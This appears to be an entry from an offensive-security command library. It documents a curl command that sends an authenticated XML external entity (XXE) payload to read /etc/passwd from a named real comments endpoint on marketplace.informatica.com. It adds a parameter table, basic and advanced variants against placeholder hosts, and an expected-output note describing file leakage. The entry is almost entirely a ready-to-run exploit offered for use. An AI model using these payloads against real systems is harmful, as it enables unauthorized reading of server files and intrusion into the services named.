---
data: >-
  curl -X POST
  https://marketplace.informatica.com/__services/v2/rest/comments/1491946873/3248
  -H "Content-Type: application/xml" -H "Cookie: session_cookie_here" -d '<?xml
  version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe
  SYSTEM "file:///etc/passwd1" >]><foo>&xxe;</foo>'
tags:
  - http
  - xxe
  - authenticated
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 7c42e91f-4a61-4060-ace6-1fcea1084711
created_at: '2025-12-13T09:00:27.482Z'
updated_at: '2025-12-13T09:00:27.482Z'
verified: false
validated: true
submitted: true
---
# curl-authenticated-post-xml

## Command

```bash
curl -X POST https://marketplace.informatica.com/__services/v2/rest/comments/1491946873/3248 -H "Content-Type: application/xml" -H "Cookie: session_cookie_here" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd1" >]><foo>&xxe;</foo>'
```

## Description

Sends an authenticated malicious XML payload via POST to exploit XXE in a comments endpoint, including session cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/xml"` | Sets XML content type | Yes |
| `-H "Cookie: session_cookie_here"` | Includes authentication cookie | Yes |
| `-d 'xml_payload'` | The malicious XML data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/comments -H "Content-Type: application/xml" -H "Cookie: session=abc" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/comments -H "Content-Type: application/xml" -H "Authorization: Bearer token" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

## Expected Output

Response indicating entity processing and potential file leakage.

## Related

- [[commands/curl-send-malicious-xml-payload]]
- [[procedures/Exploit-XXE-in-Comments-Endpoint-for-File-Read]]
